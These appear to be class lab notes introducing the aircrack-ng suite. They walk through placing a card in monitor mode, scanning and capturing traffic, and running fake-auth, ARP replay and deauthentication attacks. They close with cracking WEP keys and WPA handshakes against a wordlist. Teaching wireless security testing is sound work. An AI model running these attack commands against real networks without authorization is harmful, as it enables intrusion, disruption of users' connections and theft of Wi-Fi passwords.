TOOL INTRO


**airmon-ng**

#first run just airmon-ng to see your interfaces
#see all your devices and assigned drivers
#now start the device you want
#one is great and two is better
#avoid using wlan0 the best you can
#wlan0 is usually your internal card and does not always work for hacker mode (monitor mode and packet injection)

airmon-ng

airmon-ng start wlanX

airmon-ng start wlanX <channel number>

#if you have problems you need to check or check kill

airmon-ng check kill

#usually wpasuplicant or Network Manager is listed
#these services perform normal computer wifi operations and interfere with hackermode


**airodump-ng**

#now lets see what networks are present

airodump-ng wlanXmon

#now lets see more

airodump-ng -b abg wlanXmon

#If you run airodump with out additional flags it will only scan 2.4GHz

#MORE FILTERING

#we can do further with channel bandwidth selection if you need it

-2 or --ht20
-3 or --ht40+ 
-4 or --ht40-


#by default airodump-ng will channel hop
#isolating to a specific channel helps, even more when collecting traffic
#if something happens when you are not on a channel you will not capture it

airodump-ng -c X wlanXmon

#or by BSSID (MAC ADDRESS)

airodump-ng -d <bssid> wlanXmon

#or --bssid instsead of -d

#or by ESSID (SSID or Human Readable Name)

airodump-ng -N <SSID>

#or --essid

#now lets collect 

airodump-ng wlanXmon -w <filename> 

#lets try another
#do you see more devices when running this command?

airodump-ng -b abg -R WIFI_LAB wlanXmon

#watch the channel hopping and the time
#targeted channels helps because of the delay on scanning


#put it all together when ready

airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w test wlanXmon

airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -b abg -w test wlanXmon

#isolate and filter down to just what you need to make your pcap more managable

**aireplay-ng**
#note the new flags for the new tool so -b wont be the same as airodump-ng

#TEST YOUR INTERFACE
#-9 is testing flag
aireplay-ng -9 <INT>


REPLAY OPTIONS
#-a <BSSID>
#-d <destination MAC> (AP)
#-h <source MAC> (INT MAC)
#-e <ESSID>

#-0 Deauth
#-1 Fake Auth
#-3 ARP Replay

# 2 4 5 6 7 8 are useful for specific attacks and network situations.  Today we are just doing 1 and 9 for the class

#Fake Auth
aireplay-ng -1 0 -e <ESSID> -b <BSSID> -h <ATTACK INT MAC> <INT>

#Replay Attack
aireplay-ng -3 -b <BSSID> -h <ATTACK INT MAC> <INT>

#Deauth Attack
aireplay-ng -0 <NUM OF DEAUTH> -e <ESSID> -c <VICTIM MAC> <INT>

**aircrack-ng**

#-w for wordlist for doing WPA and WPA2

#just need to run aircrack on cap if WEP

aircrack-ng <name>.cap

#if cracking handshake you need a wordlist

aircrack-ng -w <wordlist> <name>.cap
